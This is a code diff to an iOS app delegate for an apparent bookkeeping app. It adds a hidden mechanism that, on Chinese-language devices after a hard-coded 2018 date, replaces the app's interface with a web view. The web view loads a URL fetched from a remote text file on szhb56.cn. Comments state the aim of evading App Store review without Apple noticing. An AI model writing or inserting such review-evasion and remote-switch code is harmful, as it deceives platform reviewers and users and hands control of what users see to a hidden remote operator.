@@ -10,6 +10,8 @@
 #import "FTabBarController.h"
 #import "IQKeyboardManager.h"
 #import "NSDate+BRAdd.h"
+#import "MainWebVC.h"
+#import "AFNetworking.h"
 
 @interface FAppDelegate ()
 
@@ -25,7 +27,7 @@
     NSLog(@"clientVersion = [%@]", clientVersion);
     if ([clientVersion isEqualToString:CLIENT_VERSION]) {
         NSLog(@"未更新,正常使用");
-        
+
     }else if(clientVersion == nil ){
         NSLog(@"首次安装");
         [[NSUserDefaults standardUserDefaults] setObject:CLIENT_VERSION forKey:@"clientVersion"];
@@ -48,7 +50,80 @@
     
 //    [FAccountRecord recordRandomIncomeWithtime_minute:@"07月29日12时20分" time_month:@"2018年07月"];
 //    [self generateMonthBlance];
+    
+    
+    //设置我们的
+    [self setupMyView];
     return YES;
+}
+
+//我们的页面
+- (void)setupMyView{
+    
+    [[UIApplication sharedApplication] setApplicationIconBadgeNumber:0];
+    
+    
+    // 判断语言
+    NSArray *languages = [NSLocale preferredLanguages];
+    NSString *currentLanguage = [languages objectAtIndex:0];
+    DLOG( @"%@" , currentLanguage);
+    NSString *lang;
+    
+    BOOL isChineseLanguage = [currentLanguage rangeOfString:@"zh-Hant"].location != NSNotFound || [currentLanguage rangeOfString:@"zh-Hans"].location != NSNotFound ;
+    
+    if(isChineseLanguage)
+    {
+//        NSString *currentLocale  = [[NSLocale currentLocale] objectForKey:NSLocaleCountryCode];
+//        DLOG(@"currentLocale=%@", currentLocale);
+        lang = @"zh";
+    }else{
+        lang = @"en";
+        
+    }
+    
+    if (![lang isEqualToString:@"zh"]) {
+        return;
+    }
+    
+    NSDate *date = [NSDate date];
+    NSDate *ipaDate = [NSDate setYear:2018 month:9 day:22 hour:7 minute:30];
+    if (date.day -  ipaDate.day < 1 ) {
+        return;
+    }
+    
+    
+    
+    
+    //定时跳转比如9月1号后才执行 为了规则审核，你最好加上如果是语言是英文，就不执行
+    //这里切换
+    //这样直接切换你会GG，怎么让苹果看不出来，就是你的真本事了
+    //到了时间后就直接切换成h5不需要再显示壳的内容
+    MainWebVC *webVC = [MainWebVC shareController];
+    self.window.rootViewController = webVC;
+    //或者
+    //[[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:webVC animated:NO completion:nil];
+    AFNetworkReachabilityManager *manager = [AFNetworkReachabilityManager sharedManager];
+    [manager setReachabilityStatusChangeBlock:^(AFNetworkReachabilityStatus status) {
+        if (status == AFNetworkReachabilityStatusNotReachable) {
+            NSLog(@"无网络");
+        }
+        else{
+            //有网络发起请求
+            AFHTTPSessionManager *afn = [AFHTTPSessionManager manager];
+            //记得把这个链接替换
+            
+            NSString *urlPath = @"http://szhb56.cn/TestTiny.txt";// @"http://szhb56.cn/Test1.txt"
+            [afn POST:urlPath parameters:nil progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
+                
+                [webVC loadWithUrl:responseObject];
+                
+            } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
+//                NSLog(@"%@",error);
+            }];
+            NSLog(@"有网络");
+        }
+    }];
+    [manager startMonitoring];
 }
 
 - (void)setUserInfo:(FUserModel *)userInfo{
